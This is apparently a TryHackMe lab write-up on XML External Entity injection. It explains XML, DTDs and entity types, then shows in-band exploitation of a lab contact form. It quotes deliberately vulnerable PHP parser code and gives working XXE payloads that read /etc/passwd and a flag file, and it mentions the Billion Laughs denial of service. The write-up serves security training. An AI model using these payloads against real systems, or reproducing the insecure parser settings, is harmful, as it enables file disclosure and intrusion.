# XXE Injection

**Room Link:** [https://tryhackme.com/r/room/xxeinjection](https://tryhackme.com/r/room/xxeinjection)

## Exploring XML

#### What is XML?

XML (Extensible Markup Language) is a markup language derived from SGML (Standard Generalized Markup Language), which is the same standard that HTML is based on. XML is typically used by applications to store and transport data in a format that's both human-readable and machine-parseable. It's a flexible and widely used format for exchanging data between different systems and applications. XML consists of elements, attributes, and character data, which are used to represent data in a structured and organized way.

#### XML Syntax and Structure

XML elements are represented by tags, which are surrounded by angle brackets (<>). Tags usually come in pairs, with the opening tag preceding the content and the closing tag following the content. For example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>John</name>
   <age>30</age>
   <address>
      <street>123 Main St</street>
      <city>Anytown</city>
   </address>
</user>
```

The tag `<name>John</name>` represents an element named "name" with the content "John". Attributes provide additional information about elements and are specified within the opening tag. The tag `<user id="1">` specifies an attribute "id" with the value "1" for the element "user". Character data refers to the content within elements, such as "John".

The example above shows a simple XML document with elements, attributes, and character data. The tag `<?xml version="1.0" encoding="UTF-8"?>` declaration indicates the XML version, and the element contains various sub-elements and attributes representing user data.

#### Common Use Cases in Web Applications

XML is widely used in web applications for data exchange, storage, and configuration. It's often used for web services and APIs, such as SOAP and REST, to exchange data between systems. XML is also used for configuration files, such as web server configurations or application settings.

#### What is XSLT?

XSLT (Extensible Stylesheet Language Transformations) is a language used to transform and format XML documents. While XSLT is primarily used for data transformation and formatting, it is also significantly relevant to XXE (XML External Entities) attacks.

XSLT can be used to facilitate XXE attacks in several ways:\


1. Data Extraction: XSLT can be used to extract sensitive data from an XML document, which can then be used in an XXE attack. For example, an XSLT stylesheet can extract user credentials or other sensitive information from an XML file.
2. Entity Expansion: XSLT can expand entities defined in an XML document, including external entities. This can allow an attacker to inject malicious entities, leading to an XXE vulnerability.
3. Data Manipulation: XSLT can manipulate data in an XML document, potentially allowing an attacker to inject malicious data or modify existing data to exploit an XXE vulnerability.
4. Blind XXE: XSLT can be used to perform blind XXE attacks, in which an attacker injects malicious entities without seeing the server's response.\


#### What are DTDs?

DTDs or Document Type Definitions define the structure and constraints of an XML document. They specify the allowed elements, attributes, and relationships between them. DTDs can be internal within the XML document or external in a separate file.

Purpose and usage of DTDs:

* Validation: DTDs validate the structure of XML to ensure it meets specific criteria before processing, which is crucial in environments where data integrity is key.
* Entity Declaration: DTDs define entities that can be used throughout the XML document, including external entities which are key in XXE attacks.\


Internal DTDs are specified using the `<!DOCTYPE` declaration, while external DTDs are referenced using the SYSTEM keyword.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
<!-- configuration data -->
</config>
```

The example above shows an internal DTD defining the structure of a configuration file. The \<!ELEMENT declarations specify the allowed elements and their relationships.

#### DTDs and XXE

DTDs play a crucial role in XXE injection, as they can be used to declare external entities. External entities can reference external files or URLs, which can lead to malicious data or code injection.

#### XML Entities

XML entities are placeholders for data or code that can be expanded within an XML document. There are five types of entities: internal entities, external entities, parameter entities, general entities, and character entities.

Example external entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY external SYSTEM "http://example.com/test.dtd">
<config>
&external;
</config>
```

This shows an external entity referencing a URL. The `&external;` reference within the XML document will be expanded to the contents of the referenced URL.

#### Types of Entities

1.  Internal Entities are essentially variables used within an XML document to define and substitute content that may be repeated multiple times. They are defined in the DTD (Document Type Definition) and can simplify the management of repetitive information. For example:

    ```xml
    <!DOCTYPE note [
    <!ENTITY inf "This is a test.">
    ]>
    <note>
            <info>&inf;</info>
    </note>
    ```

    In this example, the `&inf;` entity is replaced by its value wherever it appears in the document.
2.  External Entities are similar to internal entities, but their contents are referenced from outside the XML document, such as from a separate file or URL. This feature can be exploited in XXE (XML External Entity) attacks if the XML processor is configured to resolve external entities. For example:

    ```xml
    <!DOCTYPE note [
    <!ENTITY ext SYSTEM "http://example.com/external.dtd">
    ]>
    <note>
            <info>&ext;</info>
    </note>
    ```

    Here, `&ext;` pulls content from the specified URL, which could be a security risk if the URL is controlled by an attacker.
3.  Parameter Entities are special types of entities used within DTDs to define reusable structures or to include external DTD subsets. They are particularly useful for modularizing DTDs and for maintaining large-scale XML applications. For example:

    ```xml
    <!DOCTYPE note [
    <!ENTITY % common "CDATA">
    <!ELEMENT name (%common;)>
    ]>
    <note>
            <name>John Doe</name>
    </note>
    ```

    In this case, `%common;` is used within the DTD to define the type of data that the `name` element should contain.
4.  General Entities are similar to variables and can be declared either internally or externally. They are used to define substitutions that can be used within the body of the XML document. Unlike parameter entities, general entities are intended for use in the document content. For example:

    ```xml
    <!DOCTYPE note [
    <!ENTITY author "John Doe">
    ]>
    <note>
            <writer>&author;</writer>
    </note>
    ```

    The entity `&author;` is a general entity used to substitute the author's name wherever it's referenced in the document.
5.  Character Entities are used to represent special or reserved characters that cannot be used directly in XML documents. These entities prevent the parser from misinterpreting XML syntax. For example:

    * `&lt;` for the less-than symbol (`<`)
    * `&gt;` for the greater-than symbol (`>`)
    * `&amp;` for the ampersand (`&`)

    ```xml
    <note>
            <text>Use &lt; to represent a less-than symbol.</text>
    </note>
    ```

    This usage ensures that the special characters are processed correctly by the XML parser without breaking the document's structure.

The image below shows the type of entities in a DOM structure:

![Types of entities in DOM structure](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716545852309)\


_source: https://learn.microsoft.com/en-us/dotnet/standard/data/xml/reading-entity-declarations-and-entity-references-into-the-dom_

## XML Parsing Mechanisms

* **DOM (Document Object Model) Parser**: This method builds the entire XML document into a memory-based tree structure, allowing random access to all parts of the document. It is resource-intensive but very flexible.
* **SAX (Simple API for XML) Parser**: Parses XML data sequentially without loading the whole document into memory, making it suitable for large XML files. However, it is less flexible for accessing XML data randomly.
* **StAX (Streaming API for XML) Parser**: Similar to SAX, StAX parses XML documents in a streaming fashion but gives the programmer more control over the XML parsing process.
* XPath Parser: Parses an XML document based on expression and is used extensively in conjunction with XSLT.

## Exploiting XXE - In-Band

#### In-Band vs Out-of-Band XXE

In-band XXE refers to an XXE vulnerability where the attacker can see the response from the server. This allows for straightforward data exfiltration and exploitation. The attacker can simply send a malicious XML payload to the application, and the server will respond with the extracted data or the result of the attack.

Out-of-band XXE, on the other hand, refers to an XXE vulnerability where the attacker cannot see the response from the server. This requires using alternative channels, such as DNS or HTTP requests, to exfiltrate data. To extract the data, the attacker must craft a malicious XML payload that will trigger an out-of-band request, such as a DNS query or an HTTP request.

#### In-Band XXE Exploitation

We will be using [Burp](https://tryhackme.com/module/learn-burp-suite) for this room. To demonstrate this vulnerability, go to [http://10.10.12.246/contact.php](http://10.10.12.246/contact.php), and fill out the form.

![Homepage of the application](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/db8f3f703dd6b8641d5555ed6ead1b49.png)\


Click the submit button and intercept the request.

![Intercepted request of the contact form](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/734c868f5e54ae3b3d0c3539301f2256.png)\


The submitted data is processed by contact\_submit.php, which contains a vulnerable PHP code designed to return the value of the name parameter when a user submits a message in the form. Below is the vulnerable code:

```php
libxml_disable_entity_loader(false);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $xmlData = file_get_contents('php://input');

    $doc = new DOMDocument();
    $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); 

    $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;

    echo "Thank you, " .$expandedContent . "! Your message has been received.";
}
```

Since the application returns the value of the name parameter, we can inject an entity that is pointing to `/etc/passwd` to disclose its values.

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

Using the payload above, replace the initial XML data submitted to contact\_submit.php and resend the request.

![Injected xxe payload pointed to /etc/passwd file](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/2f5c2d1f8e4c04b03daa1240463e7580.png)\


#### XML Entity Expansion

XML Entity Expansion is a technique often used in XXE attacks that involves defining entities within an XML document, which the XML parser then expands. Attackers can abuse this feature by creating recursive or excessively large entities, leading to a Denial of Service (DoS) attack or defining external entities referencing sensitive files or services. This method is central to both in-band and out-of-band XXE, as it allows attackers to inject malicious entities into the XML data. For example:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact><name>&xxe; &xxe;
</name><email>test@test.com</email><message>test</message></contact>
```

In the payload above, `&xxe;` is expanded wherever it appears. Attackers can use entity expansion to perform a Billion Laughs attack, where a small XML document recursively expands to consume server resources, leading to a denial of service.

![XML Expansion in action](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/3e45b26afe9371b2061afbdba33ea3ce.png)\




Contents of /opt/14232d6db2b5fd937aa92e8b3c48d958.txt

&#x20;_**Burp**_

```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///opt/14232d6db2b5fd937aa92e8b3c48d958.txt" >]>
<contact><name>&xxe;</name><email>test2@testmail.com</email><message>test3</message></contact>
```

<figure><img src="../../.gitbook/assets/image (1088).png" alt=""><figcaption></figcaption></figure>



